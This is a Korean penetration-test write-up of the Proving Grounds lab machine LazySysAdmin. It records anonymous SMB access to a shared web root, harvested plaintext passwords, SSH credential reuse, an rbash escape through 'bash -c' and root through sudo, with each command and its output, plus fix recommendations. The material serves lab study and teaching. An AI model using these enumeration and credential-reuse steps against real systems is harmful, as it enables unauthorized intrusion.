---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smb
  - tech/cred/reuse
  - tech/lin/rbash-escape
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.248.36
domain: admin.local
ports: [22, 80, 139, 445, 3306, 6667]
services: [http, irc, microsoft-ds, mysql, netbios-ssn, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.248.36` · Ubuntu 14.04.5 LTS(Trusty Tahr) · Fundamental · 플래그 2개
> 진입점: Samba 널 세션 공유 `share$` 가 웹루트(`/var/www/html/`)를 그대로 노출 → `deets.txt` 평문 `12345` + `wp-config.php` `Admin:TogieMYSQL12345^^` 회수 → `rpcclient` SID 역조회로 사용자명 `togie` 확정 → `ssh togie:12345` 성공(rbash 제한 셸 → `bash -c` 로 탈출)
> 권한상승: `togie` 가 `sudo` 그룹 소속 + `(ALL : ALL) ALL` — 이미 쥔 비밀번호로 `sudo -S -l`/`sudo -S -i` 재확인 후 즉시 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.36

### Initial Access – Samba 널 세션이 웹루트를 노출해 평문 자격증명이 SSH 계정 재사용으로 이어짐

**Vulnerability Explanation:**
- Samba `share$` 공유가 `guest ok = yes` + 전역 `map to guest = bad user` 로 구성돼 존재하지 않는 계정으로 온 인증을 게스트로 강등 — 익명(널 세션)으로 재귀 열람 가능
- 그 공유의 `path` 가 Apache 문서 루트(`/var/www/html/`)와 동일 — 파일 공유 노출이 곧 웹 애플리케이션 소스·설정 전체 노출
- 웹루트 안의 `deets.txt`(평문 SSH 비밀번호 메모)·`wp-config.php`(WordPress DB 자격증명)가 그대로 다운로드됨
- 회수한 비밀번호 패턴(`12345`, `TogieMYSQL12345^^`)이 OS 계정 `togie` 에도 그대로 재사용됨 — 자격증명 재사용

**Vulnerability Fix:**
- 파일 공유가 웹 애플리케이션 문서 루트를 가리키지 않도록 분리
- 익명 접근 차단 — `guest ok = no` + `valid users`, `map to guest = never`
- 비밀번호를 평문 파일로 서버에 남기지 않음. 서비스별 고유 비밀번호 사용(재사용 금지)

**Severity:** High — 무인증 파일 공유 열람으로 평문 자격증명 전량 탈취, 재사용으로 즉시 대화형 SSH 셸 획득

**Steps to reproduce the attack:**
1. `smbclient -L //192.168.248.36 -N` 로 공유 목록 확인 → `share$` 가 널 세션 허용
2. `smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'` 로 재귀 열람 → 웹루트 파일 전체 노출 확인
3. `deets.txt`(평문 SSH 비밀번호) · `wp-config.php`(DB 자격증명) 회수
4. `rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-1000"` 로 사용자명 `togie` 확정
5. 회수한 자격증명 조합을 SSH 에 재사용 → `togie:12345` 성공
6. `/bin/rbash` 제한 셸 확인 → `bash -c '...'` 로 탈출 후 `local.txt` 원위치 확인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.36 | TCP: 22, 80, 139, 445, 3306, 6667 |

```text
# Nmap 7.98 scan initiated Thu Aug 20 16:43:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.36
Nmap scan report for 192.168.248.36
Host is up (0.084s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Silex v2.2.7
|_http-title: Backnode
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.45.207
|_  error: Closing link: (nmap@192.168.45.207) [Client exited]
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-08-20T07:43:55
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2026-08-20T17:43:55+10:00

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   83.61 ms 192.168.45.1
2   83.52 ms 192.168.45.254
3   83.69 ms 192.168.251.1
4   83.78 ms 192.168.248.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 16:44:06 2026 -- 1 IP address (1 host up) scanned in 41.44 seconds
```
— 출처: `~/PG/LazySysAdmin/nmap.log` 전문. `nmap.full.txt` 는 같은 스캔의 화면 출력본으로 첫·끝 행 서식만 다름

버전 근거 둘 — `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8` + `Apache 2.4.7 (Ubuntu)` 배너가 독립적으로 Ubuntu 14.04(trusty) 를 가리킴. 셸 획득 후 `/etc/os-release` 가 세 번째 근거를 줌.

```text
===== OS =====
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
NAME="Ubuntu"
VERSION="14.04.5 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.5 LTS"
VERSION_ID="14.04"
```
— 출처: `~/PG/LazySysAdmin/harvest_root.txt`

배너와 설치 버전을 따로 대조함 — 같은 파일 `PKGS` 섹션의 `dpkg -l` 이 `openssh-server 1:6.6p1-2ubuntu2.8` · `apache2 2.4.7-1ubuntu4.17` · `samba 2:4.3.11+dfsg-0ubuntu0.14.04.10` 으로 세 배너와 전부 일치. 커널은 `4.4.0-31-generic`(i686).

예열 스캔(`quick.log`, `--top-ports 200`)은 6667/tcp 를 놓쳤고 `-p-` 전체 스캔에서 잡힘. `nmap-services` 개방빈도 순으로는 tcp 300위권이라 기본 `--top-ports 1000` 안에는 들어오는 포트 — 놓친 원인은 예열 범위를 200으로 좁혀 돌렸기 때문임.

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```
— 출처: `~/PG/LazySysAdmin/quick.log`

**웹(80) — Silex 정적 랜딩 페이지.** `robots.txt` 가 `/old/ /test/ /TR2/ /Backnode_files/` 를 흘리나, SMB 로 웹루트를 통째로 본 결과 `old/`·`test/` 는 빈 디렉터리였고 `TR2/` 는 웹루트에 아예 없었음(`Backnode_files/` 는 랜딩 페이지의 css·js·이미지).

![[PG-LazySysAdmin-index.png]]

`/wordpress/` 첫 포스트 본문이 `My name is togie.` 를 56회 반복 — SMB 쪽 `rpcclient` 조회와 별개로 사용자명을 확인해주는 두 번째 신호.

![[PG-LazySysAdmin-wordpress.png]]

**SMB(139/445) — 널 세션.**

```bash
smbclient -L //192.168.248.36 -N
```
```text
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	share$          Disk      Sumshare
	IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAZYSYSADMIN
```
— 출처: `~/PG/LazySysAdmin/smb_shares.txt`

`-N` = 널 세션(익명). `IPC$` 코멘트가 `IPC Service (Web server)` — Samba `server string` 설정값이 그대로 노출되며 이 호스트가 "Web server" 임을 미리 시사함.

```bash
smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'
```
```text
  .                                   D        0  Tue Aug 15 20:05:52 2017
  ..                                  D        0  Mon Aug 14 21:34:47 2017
  wordpress                           D        0  Tue Aug 15 20:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 21:08:26 2017
  wp                                  D        0  Tue Aug 15 19:51:23 2017
  deets.txt                           N      139  Mon Aug 14 21:20:05 2017
  robots.txt                          N       92  Mon Aug 14 21:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 21:39:56 2017
  apache                              D        0  Mon Aug 14 21:35:19 2017
  index.html                          N    36072  Sun Aug  6 14:02:15 2017
  info.php                            N       20  Tue Aug 15 19:55:19 2017
  test                                D        0  Mon Aug 14 21:35:10 2017
  old                                 D        0  Mon Aug 14 21:35:13 2017

\wordpress
  .                                   D        0  Tue Aug 15 20:21:08 2017
  ..                                  D        0  Tue Aug 15 20:05:52 2017
  wp-config-sample.php                N     2853  Wed Dec 16 18:58:26 2015
  wp-trackback.php                    N     4513  Sat Oct 15 04:39:28 2016
  wp-admin                            D        0  Thu Aug  3 06:02:02 2017
  wp-settings.php                     N    16200  Fri Apr  7 03:01:42 2017
  wp-blog-header.php                  N      364  Sat Dec 19 20:20:28 2015
  index.php                           N      418  Wed Sep 25 09:18:11 2013
  wp-cron.php                         N     3286  Mon May 25 02:26:25 2015
  wp-links-opml.php                   N     2422  Mon Nov 21 11:46:30 2016
  readme.html                         N     7413  Mon Dec 12 17:01:39 2016
  wp-signup.php                       N    29924  Tue Jan 24 20:08:42 2017
  wp-content                          D        0  Mon Aug 21 19:07:27 2017
  license.txt                         N    19935  Tue Jan  3 02:58:42 2017
  wp-mail.php                         N     8048  Wed Jan 11 14:13:43 2017
  wp-activate.php                     N     5447  Wed Sep 28 06:36:28 2016
  .htaccess                           H       35  Tue Aug 15 20:40:13 2017
  xmlrpc.php                          N     3065  Thu Sep  1 01:31:29 2016
  wp-login.php                        N    34327  Sat May 13 02:12:46 2017
  wp-load.php                         N     3301  Tue Oct 25 12:15:30 2016
  wp-comments-post.php                N     1627  Mon Aug 29 21:00:32 2016
  wp-config.php                       N     3703  Mon Aug 21 18:25:14 2017
  wp-includes                         D        0  Thu Aug  3 06:02:03 2017

\Backnode_files
  .                                   D        0  Mon Aug 14 21:08:26 2017
  ..                                  D        0  Tue Aug 15 20:05:52 2017
  styles.css                          N    13681  Sun Aug  6 10:36:42 2017
```
— 출처: `~/PG/LazySysAdmin/smb_share_ls.txt` 앞부분. 이하 `Backnode_files/` 의 css·js·이미지와 `wordpress/` 하위 디렉터리 목록이 이어짐. 원본 파일은 8192바이트에서 끊겨 마지막 행이 미완임

`index.html`·`robots.txt`·`wordpress/` — 웹루트임. `robots.txt` 항목과 이 디렉터리 목록이 1:1 대응하는 것이 결정적 대조.

사후(root 획득 후) 확인한 `smb.conf`:

```ini
[share$]
   comment = Sumshare
   path = /var/www/html/
   browseable = yes
   read only = yes
   guest ok = yes
```
— 출처: `~/PG/LazySysAdmin/smb_conf_share.txt` 중 `smb.conf` 부분. 원본 파일은 이 앞에 SSH 배너와 `[sudo] password for togie:` 프롬프트가 붙어 있음

전역 설정의 `map to guest = bad user` 가 존재하지 않는 계정 인증을 게스트로 강등시켜 `-N` 이 통했음(root 획득 후 확인).

`enum4linux -U` 는 사용자 목록을 못 뽑음(Perl 경고만 출력, 빈 결과) — Unix 계정은 SAM RID 가 아니라 `S-1-22-1-<uid>` 네임스페이스에 있어 `rpcclient` SID 역조회가 필요함.

```bash
for r in 1000 1001 1002; do rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-$r"; done
```
```text
S-1-22-1-1000 Unix User\togie (1)
S-1-22-1-1001 Unix User\1001 (1)
S-1-22-1-1002 Unix User\1002 (1)
```
— 명령 출력 원문은 산출물로 보존되지 않음 `[가정]`. `writeup_notes.txt` 16:45 항목이 `rpcclient lookupsids S-1-22-1-1000 → togie` 와 `enum4linux -U` 빈 결과를 기록

때려본 범위(1000~1002) 안에서는 1000 만 이름으로 해석됨 — `togie` 로 확정. 셸 획득 후 `/etc/passwd` 에서도 일반 계정은 `togie` 뿐이었음.

### Initial Access – SMB 웹루트 노출 → 자격증명 재사용으로 SSH 진입

```bash
cat deets.txt
```
```text
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```

```bash
cat todolist.txt
```
```text
Prevent users from being able to view to web root using the local file browser
```

`todolist.txt` 는 지금 하고 있는 것을 관리자가 TODO 로만 적어둔 자백 — 이런 파일이 나오면 「아직 안 고쳐진 것들의 목록」으로 읽을 것.

```bash
grep -i -E "DB_|table_prefix" wp-config.php
```
```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
$table_prefix  = 'wp_';
```

후보 조합 넷 — `togie:12345` · `togie:TogieMYSQL12345^^` · `Admin:TogieMYSQL12345^^` · `root:12345`. `DB_PASSWORD` 안의 `Togie` 가 `deets.txt` 의 `12345` 와 같은 사람의 습관임을 확인해줌(`TogieMYSQL12345` = `Togie` + 서비스명 + `12345`).

`togie:12345` 가 첫 시도에 통함.

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=10 togie@192.168.248.36 'id; hostname; pwd'
```
```text
Warning: Permanently added '192.168.248.36' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
LazySysAdmin
/home/togie
```
— 출처: `~/PG/LazySysAdmin/try1_ssh_togie_12345.log`

`-o PreferredAuthentications=password` 를 빼면 최신 OpenSSH 클라이언트가 keyboard-interactive/publickey 를 먼저 시도하다 `sshpass` 가 비밀번호를 못 넣고 실패함. `groups` 에 `27(sudo)` — 이 시점에 권한상승 경로가 사실상 확정.

**rbash 감옥.** `harvest.sh` 업로드·실행을 시도하다 확인.

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'sh /tmp/.h.sh >/dev/null 2>&1; wc -l /tmp/.h/harvest.txt'
```
```text
rbash: /dev/null: restricted: cannot redirect output
wc: /tmp/.h/harvest.txt: No such file or directory
```

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'echo SHELL=$SHELL; echo 0=$0; echo PATH=$PATH; grep togie /etc/passwd; ls -la /tmp/.h.sh; echo TEST; echo hi > /tmp/zz'
```
```text
SHELL=/bin/rbash
0=rbash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
-rwxrwxr-x 1 togie togie 2711 Aug 20 17:44 /tmp/.h.sh
TEST
rbash: /tmp/zz: restricted: cannot redirect output
```

`/etc/passwd` 의 셸이 `/bin/rbash`. 실제로 막히는 항목을 하나씩 확인(산출물 mtime 기준 이 정리 자체는 root 획득 뒤인 16:49 KST 에 돌린 것):

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'cd /tmp; /bin/ls /home; PATH=/tmp; export -f x'
```
```text
rbash: line 0: cd: restricted
rbash: /bin/ls: restricted: cannot specify `/' in command names
rbash: PATH: readonly variable
```
— 출처: `~/PG/LazySysAdmin/try8_rbash_limits.log`

rbash 가 막는 것 — `cd` · 명령 이름에 `/` 포함 · `>`/`>>` 리다이렉션 · `PATH`·`SHELL`·`ENV`·`BASH_ENV` 대입 · `hash -p` · `enable`/`command` 로 빌트인 우회 · `-r` 해제. **막지 않는 것: PATH 에 이미 있는 실행파일을 이름만으로 부르는 것.** 여기 PATH 는 화이트리스트로 좁혀지지 않은 평범한 기본 PATH — 그래서 `/bin/bash` 가 `bash` 라는 이름만으로 그대로 잡힘.

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo esc > /tmp/zz; cat /tmp/zz; id; ls -la /home/togie'"
```
```text
esc
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
total 28
drwxr-xr-x 3 togie togie 4096 Jul  9  2020 .
drwxr-xr-x 3 root  root  4096 Aug 14  2017 ..
-rw------- 1 togie togie    0 Mar  5  2020 .bash_history
-rw-r--r-- 1 togie togie  220 Aug 14  2017 .bashrc
drwx------ 2 togie togie 4096 Aug 14  2017 .cache
-rw-r--r-- 1 togie togie   33 Aug 20 17:40 local.txt
-rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
```

리다이렉션이 살아남 — rbash 는 자기 프로세스의 동작만 제한하고, 자식으로 뜬 `bash` 는 `-r` 없이 시작하므로 제한이 없음.

로컬 플래그 확인. `sudo -S -l` 재확인은 이 직후(타겟 시각 17:45:34~40)에 이어지며 전체 출력은 Privilege Escalation 절에 있음.

```bash
sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'whoami; id; hostname; hostname -I; date; cat local.txt'"
```

`[가정]` — 명령 원문은 보존되지 않았고 위는 Privilege Escalation 절의 root 플래그 명령과 같은 형태로 재구성한 것. 실행한 페이로드(`bash -c 'whoami; id; ...; cat local.txt'`)는 출력이 직접 증명하고, `-tt` 는 출력 끝의 `Connection to ... closed.` 와 타겟 `wtmp` 의 `togie pts/0` 2건이 뒷받침함.

```text
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

togie
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
LazySysAdmin
192.168.248.36 
Thu Aug 20 17:45:25 AEST 2026
3170c6b1e7bac5a3dc430b899115d3b4
Connection to 192.168.248.36 closed.
```
— 출처: `~/PG/LazySysAdmin/proof_user.txt` 전문. SSH 배너·클라이언트 경고를 포함해 자르지 않음

블록에 `┌──(kali㉿kali)` 형태의 Kali 프롬프트가 없는 이유 — 이 박스는 대화형 Kali 터미널이 아니라 비대화형 `ssh kali "..."` 로 작업했고, `~/.zsh_history` 에 이 박스 관련 명령이 0건임(zsh 는 대화형 세션에서만 히스토리를 씀). 타겟 쪽 세션에는 `-tt` 로 pty 가 붙었으므로 출력 끝에 `Connection to ... closed.` 가 찍히고 타겟 `wtmp` 에 `togie pts/0` 가 남음. `proof_root.txt` 의 `stdin: is not a tty` 는 pty 부재를 뜻하지 않음 — `echo 12345 | sudo -S -i` 에서 sudo 가 띄운 로그인 셸의 stdin 만 파이프인 것이고, 자세한 것은 Privilege Escalation 절.

**수동 대안(자동 도구 금지 대비).** 이 경로에는 sqlmap 류가 필요한 지점이 없음 — SMB 는 `smbclient`/`rpcclient`(열거 전용, 허용), SSH 는 표준 클라이언트. WordPress 로그인 화면(`wp-admin`)으로도 진입 가능했으나(다음 문단 「대체 경로」) SSH 가 더 빨라 안 감.

**대체 경로(안 씀).** 회수한 `Admin:TogieMYSQL12345^^` 는 SSH `togie` 계정에는 안 통했지만 WordPress `wp-login.php` 에는 통함(`POST log=Admin&pwd=TogieMYSQL12345^^` → `302 Found` / `Location: .../wp-admin/`, 출처: `try6_wplogin_admin.log`). `Appearance → Theme Editor` 로 PHP 를 심는 대체 foothold 가 존재했으나 시도하지 않음. 반대로 `togie:12345` 는 `wp-login.php` 에서 `200 OK`(폼 재표시 = 실패, 출처: `try7_wplogin_togie.log`).

**Local.txt value:**
`3170c6b1e7bac5a3dc430b899115d3b4`

### Privilege Escalation – sudo (ALL : ALL) ALL 재확인

**Vulnerability Explanation:**
- `togie` 계정이 `sudo` 그룹(`27`) 소속이고 `/etc/sudoers` 유효 규칙이 `(ALL : ALL) ALL` — 어떤 사용자·그룹으로도 어떤 명령이나 허용
- `sudo -n -l`(비밀번호 없이 조회)은 실패하지만, Initial Access 단계에서 이미 확보한 비밀번호(`12345`)로 `sudo -S -l` 을 다시 치면 즉시 전체 허용 목록이 나옴
- 권한상승이라기보다 사실상 의도된 관리자 권한 부여 — 일반 계정에 무제한 sudo + 취약한 5자리 숫자 비밀번호를 함께 준 구성

**Vulnerability Fix:**
- `togie` 를 `sudo` 그룹에서 제거하거나 필요한 명령만 `sudoers` 에 개별 등재(NOPASSWD 남용도 금지)
- 5자리 숫자 같은 취약한 비밀번호 금지 — 비밀번호 정책 강제
- 일반 사용자 계정에 무제한 sudo 부여 금지(최소 권한 원칙)

**Severity:** Critical — 이미 손에 쥔 비밀번호로 즉시 무제한 root 획득

**Steps to reproduce the attack:**
1. 첫 SSH 로그인의 `id` 출력에서 `27(sudo)` 그룹 확인
2. `harvest.sh` 의 `sudo -n -l` 결과가 `a password is required` 로 끝나는 것과 별개로, 이미 아는 비밀번호로 `echo '<pw>' | sudo -S -l` 재확인
3. `(ALL : ALL) ALL` 확인 → `sudo -S -i bash -c '...'` 로 root 셸 진입, 플래그 원위치 확인

`harvest.sh` 의 SUDO 섹션 앞 두 줄만 보면 "sudo 없음"으로 읽힘:

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
-- sudo -S -l (HARVEST_PW) --
[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```
— 출처: `~/PG/LazySysAdmin/harvest_togie.txt`(`togie` 로 돌린 회차). `harvest_root.txt` 는 root 로 돌아 같은 섹션이 `User root may run ...` 로 찍힘

`--` 아래가 비밀번호를 넣어 다시 친 결과. 이 박스에서 실제로 root 를 잡은 순서는 `harvest.sh` 를 통해서가 아니었음 — 첫 SSH 의 `id` 로 `27(sudo)` 를 이미 봤고, 곧장 손으로 `sudo -S -l` 을 재확인했음(아래).

```bash
sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -l'"
```
```text
[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```
— 출처: `~/PG/LazySysAdmin/try_sudo_l.log`

`-S` 는 비밀번호를 stdin 에서 읽는 플래그 — 없으면 sudo 가 tty 를 직접 열어 프롬프트를 띄우므로 파이프로 넣은 비밀번호가 무시되고 비대화형 배치가 멎음.

```bash
sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -i bash -c \"whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt\"'"
```

`sudo -i` 흔적은 타겟 `auth.log` 에도 남음 — `COMMAND=/bin/bash -c bash -c whoami; id; ...` (`traces_confirmed.log`). `sudo -i <명령>` 은 root 로그인 셸을 `-c` 로 불러 명령을 넘기므로 `COMMAND` 에 셸이 먼저 찍힘.

출력 첫 줄의 `stdin: is not a tty` 는 그 로그인 셸이 읽는 `/root/.profile` 의 `mesg n` 이 tty 없는 stdin 을 만나 뱉는 잡음(`[가정]` — 14.04 기본 `.profile` 이 140바이트 그대로인 것까지만 확인, `mesg` 호출 자체를 소스로 대조하지는 않음). 다음 줄에서 `uid=0` 이 나왔으니 실패가 아님.

**다른 경로 확인.** `harvest.sh` 의 나머지 섹션을 root 획득 후 재확인. SUID 목록은 14.04 기본값 그대로(`/bin/ping`·`/bin/su`·`/usr/bin/passwd`·`/usr/bin/chsh`·`/usr/bin/pkexec`·`/usr/bin/at`·`/usr/bin/mtr` 등) — 커스텀 SUID 바이너리 없음. `CAPS`(`getcap -r /`) 도 빈 결과. `/etc/cron.d`·`cron.daily` 도 배포판 기본 + `php5` 세션 정리 뿐(출처: `harvest_root.txt`). `/usr/bin/pkexec` 가 SUID 로 있어 PwnKit(CVE-2021-4034)이 이론상 후보였으나 sudo 로 이미 root 였으므로 **시도하지 않음** — 이 박스에서 취약 여부를 확인한 적 없다(`[가정]`). 커널 `4.4.0-31-generic` 도 로컬 익스플로잇이 여럿 있는 조합이나 같은 이유로 손대지 않음.

### Post-Exploitation

**Proof.txt value:**
`09675eaefc242e881bcf18f83c340e90`

```text
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

[sudo] password for togie: stdin: is not a tty
root
uid=0(root) gid=0(root) groups=0(root)
LazySysAdmin
192.168.248.36 
Thu Aug 20 17:45:50 AEST 2026
total 24
drwx------  3 root root 4096 Aug 20 17:39 .
drwxr-xr-x 22 root root 4096 Feb 20  2020 ..
-rw-------  1 root root    0 Jul  9  2020 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14  2017 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   33 Aug 20 17:39 proof.txt
09675eaefc242e881bcf18f83c340e90
Connection to 192.168.248.36 closed.
```
— 출처: `~/PG/LazySysAdmin/proof_root.txt` 전문. SSH 배너·클라이언트 경고와 `[sudo] password for togie:` 를 포함해 자르지 않음

두 플래그 모두 **pty 가 붙은 SSH 세션(`ssh -tt`)에서 원위치 `cat`** 으로 읽음 — 웹셸 미사용. 근거 셋 — 출력 끝의 `Connection to 192.168.248.36 closed.`(ssh 가 tty 를 할당했을 때만 찍힘) · 타겟 `wtmp` 의 `togie pts/0` 2건(둘 다 17:45) · `auth.log` 17:45:50 행의 `TTY=pts/0`. 명령을 인자로 넘긴 방식이라 프롬프트 앞에 앉아 친 것은 아니지만, 셸은 타겟의 `bash`/`sudo -i` 이고 플래그는 타겟 파일시스템에서 직접 읽음. 타겟은 AEST(+1000), Kali 는 KST(+0900) — Kali 산출물 mtime 16:45 = 타겟 `date` 17:45 로 정확히 맞음. nmap 도 `clock-skew ... median: -1s`(시계는 동기), `smb-os-discovery` 는 `System time: 2026-08-20T17:43:55+10:00` 으로 타겟 타임존 +1000 을 독립 기록. 2026-08-20 인스턴스 값이며, PG 는 박스를 다시 켤 때마다 새로 생성함.

**남긴 흔적**
- `/tmp/.h.sh`(업로드한 harvest.sh) · `/tmp/.h/`(수집 출력) · `/tmp/zz`(rbash 탈출 테스트 파일) → 삭제 확인. 삭제 후 `ls -la /tmp` 가 `vmware-root` 만 남은 것을 확인
- 파일 생성·설정 변경·계정 추가 없음. SMB 쓰기 테스트(`lsa_wtest.txt`)는 `NT_STATUS_ACCESS_DENIED` 로 실패해 타겟에 파일이 생기지 않음
- 리버스셸 미사용(SSH 경로) — Kali 리스너 없음. tmux 세션(`lsa_nmap`)은 이름으로 종료. NFS 마운트 없음

**로그 확인(지우지 않음).** 박스가 살아 있는 동안 root 로 되돌아가 실제로 뭐가 남았는지 셈(`traces_confirmed.log` 원문).

```text
[sudo] password for togie: ===AUTHLOG_COUNT===
68
===AUTHLOG_SAMPLE===
Aug 20 17:43:40 LazySysAdmin sshd[1697]: Did not receive identification string from 192.168.45.207
Aug 20 17:43:55 LazySysAdmin sshd[1704]: Protocol major versions differ for 192.168.45.207: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 vs. SSH-1.5-Nmap-SSH1-Hostkey
Aug 20 17:43:55 LazySysAdmin sshd[1705]: Protocol major versions differ for 192.168.45.207: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 vs. SSH-1.5-NmapNSE_1.0
Aug 20 17:43:56 LazySysAdmin sshd[1710]: Connection closed by 192.168.45.207 [preauth]
